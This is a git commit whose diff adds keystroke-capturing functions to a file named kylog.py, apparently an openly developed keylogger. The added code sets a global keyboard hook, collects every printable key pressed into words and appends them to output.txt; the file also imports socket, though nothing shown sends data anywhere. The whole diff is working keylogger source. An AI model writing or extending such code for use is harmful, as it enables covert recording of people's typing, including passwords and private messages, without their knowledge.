c17b96b3c92a153f73b5ef7f220101f44564cd52
sporestudio <jrodcas@proton.me>
2025-01-10 19:22:33 +0100

    feat: modify kylog.py
    Add several functions, among then to detect keystrokes and to store the
    detected words in a file.

--- src/kylog.py
+++ src/kylog.py
@@ -1,4 +1,5 @@
 from colorama import Fore, Style
+import argparse
 import keyboard
 import socket
 import sys
@@ -8,6 +9,32 @@ import os
 # colors
 green = Fore.GREEN
 reset = Style.RESET_ALL
+
+word = ""
+
+def reset_word():
+    global word
+    word = ""
+
+def save_word():
+    with open("output.txt", "a") as file:
+        file.write(word + "\n")
+    print(f'Word saved: {green}{word}{reset}')
+    reset_word()
+
+def press_key(keystroke):
+    global word
+
+    if keystroke.event_type == keyboard.KEY_DOWN:
+        if keystroke.name == 'space':
+            save_word()
+        elif len(keystroke.name) == 1 and keystroke.name.isprintable():
+            word += keystroke.name
+
+keyboard.hook(press_key)
+
+
+
 
 
 
